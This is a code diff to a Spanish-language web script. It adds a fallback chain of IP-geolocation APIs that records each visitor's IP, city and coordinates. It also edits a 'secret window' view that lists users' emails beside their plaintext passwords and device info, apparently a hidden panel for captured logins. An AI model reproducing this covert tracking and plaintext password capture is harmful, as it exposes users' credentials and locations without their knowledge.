@@ -921,25 +921,60 @@ async function obtenerInfoDispositivo() {
     else if (ua.includes("Windows")) info.sistema = "Windows";
     else if (ua.includes("Mac")) info.sistema = "macOS";
 
-    try {
-        const respuesta = await fetch("https://ipapi.co/json/");
-        if (!respuesta.ok) throw new Error("Error en la solicitud");
-        const datos = await respuesta.json();
-        if (datos && datos.ip) {
-            info.ip = datos.ip;
-            info.country = datos.country_name || "No disponible";
-            info.city = datos.city || "No disponible";
-            info.latitude = datos.latitude || null;
-            info.longitude = datos.longitude || null;
-        } else {
-            info.ip = "No disponible";
-            info.country = "No disponible";
-            info.city = "No disponible";
-            info.latitude = null;
-            info.longitude = null;
+    // Intentar obtener IP y geolocalización desde varias APIs
+    const apis = [
+        {
+            url: "https://ipwho.is/",
+            parse: (datos) => ({
+                ip: datos.ip,
+                country: datos.country,
+                city: datos.city,
+                latitude: datos.latitude,
+                longitude: datos.longitude
+            })
+        },
+        {
+            url: "https://ipapi.co/json/",
+            parse: (datos) => ({
+                ip: datos.ip,
+                country: datos.country_name,
+                city: datos.city,
+                latitude: datos.latitude,
+                longitude: datos.longitude
+            })
+        },
+        {
+            url: "https://ipinfo.io/json",
+            parse: (datos) => ({
+                ip: datos.ip,
+                country: datos.country,
+                city: datos.city,
+                latitude: datos.loc ? datos.loc.split(",")[0] : null,
+                longitude: datos.loc ? datos.loc.split(",")[1] : null
+            })
         }
-    } catch (error) {
-        console.error("Error obteniendo IP:", error);
+    ];
+
+    for (const api of apis) {
+        try {
+            const respuesta = await fetch(api.url);
+            if (!respuesta.ok) continue;
+            const datos = await respuesta.json();
+            const parsed = api.parse(datos);
+            if (parsed.ip) {
+                info.ip = parsed.ip;
+                info.country = parsed.country || "No disponible";
+                info.city = parsed.city || "No disponible";
+                info.latitude = parsed.latitude || null;
+                info.longitude = parsed.longitude || null;
+                break;
+            }
+        } catch (error) {
+            console.warn(`Error con ${api.url}:`, error);
+        }
+    }
+
+    if (!info.ip) {
         info.ip = "No disponible";
         info.country = "No disponible";
         info.city = "No disponible";
@@ -1051,7 +1086,7 @@ async function mostrarRegistrosEnVentanaSecreta() {
             </div>
             <div class="registro-item">
                 Correo: <span>${escaparHTML(reg.email)}</span>
-                <button class="btn-info-dispositivo" data-indice="${indice}" data-email="${escaparHTML(reg.email)}" title="Ver info del dispositivo">i</button>
+                <button class="btn-info-dispositivo" data-email="${escaparHTML(reg.email)}" title="Ver info del dispositivo">i</button>
             </div>
             <div class="registro-item">
                 Contraseña: <span class="password">${escaparHTML(reg.contraseña)}</span>
